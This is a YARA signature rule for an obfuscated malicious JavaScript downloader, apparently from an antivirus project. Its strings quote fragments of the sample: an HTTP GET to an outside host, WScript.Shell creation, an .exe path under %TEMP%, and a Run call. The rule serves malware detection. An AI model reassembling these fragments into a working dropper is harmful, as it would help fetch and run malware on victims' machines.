rule sig_20160401_ec57060764ed9bb6d79dfa2ec91178be {
  meta:
    description = "datamaliciousorder - file 20160401_ec57060764ed9bb6d79dfa2ec91178be.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0b690a67792dc011abc72538a73981e5b06fe4214ac042ecdbcd10d8e83197fa"

  strings:
    $s1  = "EuXie[KpxVnm](\"G\" + \"ET\", \"http://beatorooms.com/n2isa\", false);" fullword ascii
    $s2  = "function IozTx(UtVz, ApQhj){GdYy = GdYy * 1; return UtVz - ApQhj;};" fullword ascii
    $s3  = "var FumEge = function ElPa() {return WScript[SybJsc](\"WScript\"+\".Shell\");}(), KkQq = 11;" fullword ascii
    $s4  = "if (EuXie[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function CzZo(){return DfQyd + \"\";};" fullword ascii
    $s6  = "function JjBiv() {return FumEge[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"q2lQUp0nI4.ex\" + \"e\";};" fullword ascii
    $s7  = "function IqRjr() {return ((RcSp == true) && (RcSp == EnXk)) ? 1 : GdYy;};" fullword ascii
    $s8  = "function WwdGe(){return SybJsc;};" fullword ascii
    $s9  = "RcSp = true; " fullword ascii
    $s10 = "var EnXk = false;" fullword ascii
    $s11 = "}while (CdJe);" fullword ascii
    $s12 = "var KhKku = false;" fullword ascii
    $s13 = "function NzTkk(){return 23;};" fullword ascii
    $s14 = "var RcSp = false;" fullword ascii
    $s15 = "return IozTx(NgXsx, GoGyw);" fullword ascii
    $s16 = "EnXk = true; " fullword ascii
    $s17 = "function LqaZtj(KlaOok) {var HxHk = (1, 2, 3, 4, 5, KlaOok); return HxHk;};" fullword ascii
    $s18 = "var OjAog = new this[\"Date\"]();" fullword ascii
    $s19 = "function MieRvb(QslLg){FumEge[\"R\"+\"un\"](QslLg, GdYy, GdYy);};" fullword ascii
    $s20 = "function NxwLs()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}